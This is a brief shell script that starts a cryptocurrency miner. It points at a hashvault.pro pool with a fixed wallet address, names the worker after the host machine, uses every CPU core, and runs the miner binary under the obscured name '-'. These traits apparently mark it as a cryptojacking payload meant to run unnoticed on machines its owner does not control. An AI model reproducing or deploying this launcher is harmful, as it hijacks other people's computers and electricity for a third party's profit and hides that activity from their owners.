pool="frankfurt01.hashvault.pro:80"
wallet="TRTLv3XdA6KgV9dHSXXB1pJtSjdQdLXuJewbc5TRTLv1xLSHLPhfLEmMhk6J1p42SHHSGA15jiByLzY7gvYnotcwb3L5L8FHDUJ4uH7qLkEdfxuTWAW69tZ4LtskR1eTrgWw4BJSB"
workername="$(cat /proc/sys/kernel/hostname)"
thread="$(nproc --all)"
./- -o $pool -u $wallet --keepalive --donate-level 1 -p $workername -k --tls -t$thread